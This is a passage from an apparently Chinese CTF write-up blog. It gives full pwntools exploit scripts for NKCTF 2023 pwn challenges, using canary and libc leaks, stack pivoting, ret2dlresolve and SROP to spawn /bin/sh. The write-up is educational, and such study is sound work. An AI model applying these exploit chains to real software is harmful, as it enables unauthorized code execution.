plt address**</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_name_ptr</span>(<span class="hljs-params">ptr</span>):</span><br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">16</span>, ptr, <span class="hljs-number">0x100</span>])<br>    sl(payload)<br>    ru(<span class="hljs-string">b&#x27;comment &gt;&gt; &#x27;</span>)<br><br>change_name_ptr(<span class="hljs-number">0x602028</span>)<br><br><span class="hljs-comment">#now leak libc!!! output from **name**</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>():</span><br>    sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;name : &#x27;</span>)<br>    <span class="hljs-keyword">return</span> rc(<span class="hljs-number">200</span>)<br><br>got_ent = leak()<br>read_got = u64(got_ent[:<span class="hljs-number">8</span>])<br><span class="hljs-comment"># canary = u64(stack_data)</span><br>lg(<span class="hljs-string">&#x27;read_got:&#x27;</span>, read_got)<br><br><span class="hljs-comment">#now to change name str to **environ**</span><br><span class="hljs-comment">#libc -&gt; stack</span><br>libc.address = read_got - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc base:&#x27;</span>, libc.address)<br>environ_addr = libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>change_name_ptr(environ_addr)<br><br><span class="hljs-comment">#now leak stack</span><br>stack_addr = leak()<br>stack_addr = u64(stack_addr[:<span class="hljs-number">8</span>])<br>lg(<span class="hljs-string">&#x27;some stack addr:&#x27;</span>, stack_addr)<br>canary_addr = stack_addr - <span class="hljs-number">0x140</span> <span class="hljs-comment">#+ 6*8 # 这里可能有版本的区别,kali22不用最后一项</span><br>lg(<span class="hljs-string">&#x27;canary addr:&#x27;</span>, canary_addr)<br><br><span class="hljs-comment">#now change to stack canary</span><br>change_name_ptr(canary_addr)<br><span class="hljs-comment">#now leak canary</span><br>canary = leak()<br>canary = u64(canary[:<span class="hljs-number">8</span>])<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br><span class="hljs-comment">#now directly overwrite to main ret address</span><br>one_gadget = libc.address + <span class="hljs-number">0x45216</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>rop = ROP(<span class="hljs-string">&#x27;./pwn.elf64&#x27;</span>)<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">16</span>, canary_addr-<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>, canary, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>, <br>                rop.rdi.address, libc.address+binsh_addr, system_addr])<br>debug(<span class="hljs-number">0x40150B</span>)<br>sl(payload)<br><br>itt()<br></code></pre></div></td></tr></table></figure>





<h1 id="NKCTF"><a href="#NKCTF" class="headerlink" title="NKCTF"></a>NKCTF</h1><p>五分钟内解决的签到题就不说了. </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://blog.xmcve.com/2023/03/27/NKCTF-2023-Writeup/#title-36">星盟</a> | <a target="_blank" rel="noopener" href="https://www.woodwhale.top/archives/2023nkctf#only-read">pwn</a> | <a target="_blank" rel="noopener" href="https://www.lewiserii.top/wp/NKCTF2023.html#only-read">全部</a> | </li>
</ul>
<h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><p>找了半天one_gadget发现用libc自带的system+/bin/sh不就完了……….简单的栈迁移题目, 1-3的选项的输入恰好构成迁移后的栈内容. 而且用到了pop rsp + r13r14r15 + ret, 需要空出位置给r**寄存器. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>rl = <span class="hljs-keyword">lambda</span> keep=<span class="hljs-literal">True</span>:p.recvline(keep)<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    <span class="hljs-keyword">if</span> args.REMOTE <span class="hljs-keyword">or</span> (<span class="hljs-keyword">not</span> args.DEBUG): <span class="hljs-keyword">return</span><br>    glibc_dir = <span class="hljs-string">&#x27;/glibs/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    <span class="hljs-comment">#elf_base = int(os.popen(&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print\x241&#125;&#125;\x27&#x27;.format(p.pid)).readlines()[1], 16) if elf.pie else 0</span><br>    elf_base = <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;init-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>path_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span> <span class="hljs-keyword">if</span> args.REMOTE <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;/glibs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span><br>libc = ELF(path_libc)<br>binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>elf = ELF(binary)<br>p = process(binary, aslr=<span class="hljs-literal">False</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.REMOTE <span class="hljs-keyword">else</span> remote()<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment">#debug()</span><br><br>ss(<span class="hljs-string">b&#x27;4\n&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;this. &#x27;</span>)<br>addr_puts = <span class="hljs-built_in">int</span>(rl(<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>)<br><br>pop_rsp_r1345 = <span class="hljs-number">0x40156d</span><br><span class="hljs-comment">#stack pivot:  pad    ret pop rsp    rsp to bss                                                                  </span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">10</span>+<span class="hljs-number">8</span>), pop_rsp_r1345, p64(<span class="hljs-number">0x4050A0</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>)[:<span class="hljs-number">6</span>]])<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(pl) &lt;= <span class="hljs-number">0x20</span>)<br><br>pop_rdi = <span class="hljs-number">0x401573</span><br>libc_base = addr_puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br>addr_system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>addr_binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><span class="hljs-comment">#//0x40156c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br>sl(<span class="hljs-string">b&#x27;2\n%b&#x27;</span> % p64(pop_rdi)) <br>sl(<span class="hljs-string">b&#x27;1\n%b&#x27;</span> % p64(addr_binsh)) <br>sl(<span class="hljs-string">b&#x27;3\n%b&#x27;</span> % p64(addr_system)) <br>debug(<span class="hljs-number">0x40139D</span>)<br>sl(<span class="hljs-string">b&#x27;4\n&#x27;</span>+pl)<br><br>itt()<br></code></pre></div></td></tr></table></figure>

<h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><p>简单东西, 但是没看出来base64编码….</p>
<p>更多的几行字写在ctf补充里. </p>
<p>使用了ret2dlresolve, 但是呢, 也可以这样:</p>
<ul>
<li>栈迁移到bss段, 再次执行__libc_start_main最终调用next(), 在bss段写入了libc中的地址. 然后使用<strong>任意地址加</strong>把这个地址加到one_gadget上面. 可能再调整下寄存器的地址, 不过这也没啥限制了. </li>
<li>也可以使用任意地址加直接修改got表地址, 还要更快. 不过要设置ROPgadget的depth为20, 长一点才能输出更多的gadgets. </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>rl = <span class="hljs-keyword">lambda</span> keep=<span class="hljs-literal">True</span>:p.recvline(keep)<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    <span class="hljs-keyword">if</span> args.REMOTE <span class="hljs-keyword">or</span> (<span class="hljs-keyword">not</span> args.DBG): <span class="hljs-keyword">return</span><br>    glibc_dir = <span class="hljs-string">&#x27;/glibs/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    <span class="hljs-comment">#elf_base = int(os.popen(&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print\x241&#125;&#125;\x27&#x27;.format(p.pid)).readlines()[1], 16) if elf.pie else 0</span><br>    elf_base = <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;\ninit-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>path_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span> <span class="hljs-keyword">if</span> args.REMOTE <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;/glibs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span><br>libc = ELF(path_libc)<br>binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>elf = ELF(binary)<br>p = process(binary, aslr=<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.REMOTE <span class="hljs-keyword">else</span> remote()<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># context.log_level = &#x27;info&#x27;</span><br><br>raw1 = <span class="hljs-string">b&#x27;V2VsY29tZSB0byBOS0NURiE=&#x27;</span><br>raw2 = <span class="hljs-string">b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6&#x27;</span><br>raw3 = <span class="hljs-string">b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&#x27;</span><br>raw4 = <span class="hljs-string">b&#x27;Y2FuIHlvdSBmaW5kIG1lPw=&#x27;</span><br><br>ss(raw1)<br>ss(raw2)<br>ss(raw3)<br>ss(raw4)<br><span class="hljs-comment"># debug(0x401084)</span><br><br>csu_front = <span class="hljs-number">0x401660</span><br>csu_end = <span class="hljs-number">0x40167A</span><br><span class="hljs-comment"># will take place 0x38+0x38+0x8=0x78 or 120 bytes space</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">csu_call</span>(<span class="hljs-params">pointer, edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0</span>, rdx=<span class="hljs-number">0</span>, pivot=<span class="hljs-number">0</span>, rbx=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-comment"># rdi = edi = r12d</span><br>    <span class="hljs-comment"># rsi = r13</span><br>    <span class="hljs-comment"># rdx = r14</span><br>    <span class="hljs-comment"># rbx = 0, rbp = 1</span><br>    <span class="hljs-comment"># pop sequence: rbx rbp r12 r13 r14 r15</span><br>    payload = pack(csu_end)<br>    payload += flat([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, edi, rsi, rdx, pointer, csu_front])<br>    <span class="hljs-keyword">if</span> pivot != <span class="hljs-number">0</span>:<br>        payload += flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, pivot-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>)])<br>    <span class="hljs-keyword">else</span>:<br>        payload += flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>, rbx, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>)])<br>    <span class="hljs-keyword">return</span> payload<br><br>bss = elf.get_section_by_name(<span class="hljs-string">&#x27;.bss&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br><br>stack_size = <span class="hljs-number">0x400</span> + <span class="hljs-number">0x18</span>*<span class="hljs-number">110</span><br>base = bss + stack_size<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;base&#x27;</span>, base)<br><br>rop = ROP(binary)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, base, <span class="hljs-number">0x1000</span>, pivot=base))<br>rop.raw(rop.leave.address)<br><span class="hljs-comment"># rop.raw(&#x27;b&#x27; * (256 - len(rop.chain())))</span><br>lg(<span class="hljs-string">&#x27;migrate rop len&#x27;</span>, <span class="hljs-built_in">len</span>(rop.chain()))<br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># input(&#x27;wait&#x27;)</span><br>ss(rop.chain())<br><br>binsh_addr = base + <span class="hljs-number">72</span> + <span class="hljs-number">8</span><br>binsh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rel_idx = <span class="hljs-built_in">int</span>((base + <span class="hljs-number">48</span> - rel_plt) // <span class="hljs-number">0x18</span>)<br>rop = ROP(binary)<br>rop.raw(rop.ret.address)<br>rop.raw(rop.rdi.address)<br>rop.raw(binsh_addr)<br>rop.raw(plt)<br><br>rop.raw(rel_idx)<br>rop.raw(<span class="hljs-number">0</span>)      <span class="hljs-comment"># system_ret_addr</span><br><span class="hljs-comment"># rop.raw(b&#x27;b&#x27;*8)</span><br><span class="hljs-comment"># len is 48</span><br><br>fake_rel_addr = base + <span class="hljs-number">48</span><br><span class="hljs-comment"># log.success(hex(fake_rel_addr))</span><br><span class="hljs-comment"># fake_rel_addr += 0x18 - (fake_rel_addr - rel_plt) % 0x18    # add 0x8 bytes</span><br><span class="hljs-comment"># log.success(hex(fake_rel_addr))</span><br>fake_sym_addr = base + <span class="hljs-number">96</span><br><span class="hljs-comment"># fake_sym_addr += 0x18 - (fake_sym_addr - dynsym) % 0x18</span><br><span class="hljs-comment"># log.error(str(fake_rel_addr-rel_plt)+&#x27; &#x27;+str(fake_sym_addr-dynsym))</span><br><span class="hljs-comment"># log.error(str(fake_sym_addr-base)) # 96</span><br><br>r_offset = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_sym_idx = (fake_sym_addr - dynsym) // <span class="hljs-number">0x18</span> +<span class="hljs-number">1</span><br>r_info = (read_sym_idx &lt;&lt; <span class="hljs-number">32</span>) | <span class="hljs-number">0x7</span><br>fake_read_rel = flat([r_offset, r_info, <span class="hljs-number">0</span>]) <span class="hljs-comment"># last is addend</span><br>rop.raw(fake_read_rel) <span class="hljs-comment"># len is 72</span><br><span class="hljs-comment"># log.error(str(len(rop.chain())))</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>rop.raw(binsh)<br>rop.raw(<span class="hljs-string">&#x27;system\x00&#x27;</span>)<br>rop.raw(<span class="hljs-string">&#x27;c&#x27;</span>*(<span class="hljs-number">96</span>+<span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(rop.chain())))<br><br>st_name = (base + <span class="hljs-number">72</span> + <span class="hljs-number">16</span>) - dynstr<br>fake_read_sym = p32(st_name) + p16(<span class="hljs-number">0x12</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>rop.raw(fake_read_sym)<br><span class="hljs-comment"># log.error(str(len(rop.chain()))) # 120</span><br>lg(<span class="hljs-string">&#x27;final rop len&#x27;</span>, <span class="hljs-built_in">len</span>(rop.chain()))<br><br>debug(<span class="hljs-number">0x15555553710b</span>)<br><span class="hljs-comment"># input(&#x27;wait for final rop&#x27;)</span><br>ss(rop.chain())<br>itt()<br></code></pre></div></td></tr></table></figure>

<h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><p>简单东西 SROP 仅贴出非模板的部分</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">syscall_ret = <span class="hljs-number">0x40114E</span><br>mov_rax_0xf = <span class="hljs-number">0x401146</span><br>pop_rdi = <span class="hljs-number">0x401283</span><br>vuln_read = <span class="hljs-number">0x4011DC</span><br>payload = flat([<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>+<span class="hljs-number">8</span>), syscall_ret, pop_rdi, <span class="hljs-number">1</span>, syscall_ret, vuln_read])<br><span class="hljs-comment"># debug()</span><br>sl(payload)<br>rc()<br>ss(<span class="hljs-string">b&#x27;\xaa&#x27;</span>)<br>stack_addr = u64(rc()[<span class="hljs-number">0x68</span>:<span class="hljs-number">0x70</span>])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>, stack_addr)<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">8</span>+<span class="hljs-number">8</span>) + p64(mov_rax_0xf) + p64(syscall_ret)<br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = stack_addr - <span class="hljs-number">0xe0</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rsp = stack_addr<br>frame.rip = syscall_ret<br>payload += <span class="hljs-built_in">bytes</span>(frame)<br>debug()<br>sl(payload)<br><br>itt()<br></code></pre></div></td></tr></table></figure>

<p>看到个更简单的, 都不用leak, 直接修改nkctf字符串, 然后</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">syscall = <span class="hljs-number">0x40114e</span><br>buf = <span class="hljs-number">0x404040</span><br>ax_0xf = <span class="hljs-number">0x401146</span><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">59</span><br>sigframe.rdi = buf<br>sigframe.rsi = <span class="hljs-number">0</span><br>sigframe.rdx = <span class="hljs-number">0</span><br>sigframe.rip = syscall<br><span class="hljs-comment">#直接利用rax还等于0执行read(0, nkctf, 38)</span><br>p1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x4011c8</span>)<br>r.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>, p1)<br><br>sleep(<span class="hljs-number">1</span>)<br>r.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>sleep(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#直接execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(ax_0xf) + p64(syscall) + flat(sigframe)<br>r.send(p2)<br><br>r.interactive()<br></code></pre></div></td></tr></table></figure>

